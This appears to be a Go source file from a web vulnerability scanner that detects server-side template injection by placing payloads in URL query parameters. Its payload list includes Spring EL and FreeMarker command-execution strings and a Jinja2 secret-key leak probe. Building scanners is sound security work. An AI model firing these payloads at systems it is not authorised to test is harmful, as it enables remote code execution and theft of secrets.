package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/temren/pkg/httpengine"
)

// AdvancedTemplateInjectionScanner extends SSTI coverage with engine-specific identifiers.
type AdvancedTemplateInjectionScanner struct{}

func NewAdvancedTemplateInjectionScanner() *AdvancedTemplateInjectionScanner { return &AdvancedTemplateInjectionScanner{} }

func (s *AdvancedTemplateInjectionScanner) Name() string { return "SSTI — Engine Fingerprint" }

type sstiProbe struct {
	payload string
	expect  string
	engine  string
	sev     Severity
	score   float64
}

var advancedSSTI = []sstiProbe{
	{"{{7*7}}", "49", "Jinja2/Twig", SeverityCritical, 9.0},
	{"${7*7}", "49", "Java EL / FreeMarker", SeverityCritical, 9.0},
	{"#{7*7}", "49", "Ruby ERB / Smarty", SeverityCritical, 9.0},
	{"<%= 7*7 %>", "49", "ERB", SeverityCritical, 9.0},
	{"{{config.SECRET_KEY}}", "SECRET_KEY", "Jinja2 config leak", SeverityCritical, 9.8},
	{"${T(java.lang.Runtime).getRuntime().exec('id')}", "uid=", "Spring EL", SeverityCritical, 9.8},
	{"<#assign x = 'freemarker.template.utility.Execute'?new()>${x('id')}", "uid=", "FreeMarker RCE", SeverityCritical, 9.8},
}

func (s *AdvancedTemplateInjectionScanner) Scan(ctx context.Context, target string, client *httpengine.Client) ([]Finding, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}
	q := u.Query()
	if len(q) == 0 {
		return nil, nil
	}
	var findings []Finding
	for param := range q {
		for _, p := range advancedSSTI {
			tq := url.Values{}
			for k, v := range q {
				if k == param {
					tq.Set(k, p.payload)
				} else {
					tq.Set(k, v[0])
				}
			}
			u.RawQuery = tq.Encode()
			req, _ := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
			resp, err := client.Do(ctx, req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			resp.Body.Close()
			if strings.Contains(string(body), p.expect) {
				findings = append(findings, Finding{
					URL: u.String(), Title: fmt.Sprintf("Server-Side Template Injection (%s)", p.engine),
					Description: "Template engine evaluated injected expression. RCE may be trivial depending on engine.",
					Severity: p.sev, Confidence: ConfidenceHigh, Scanner: s.Name(),
					Parameter: param, Payload: p.payload, Evidence: p.expect,
					Timestamp: time.Now(), OWASPCategory: "A03:2021-Injection", CVSSScore: p.score,
				})
				break
			}
		}
	}
	return findings, nil
}
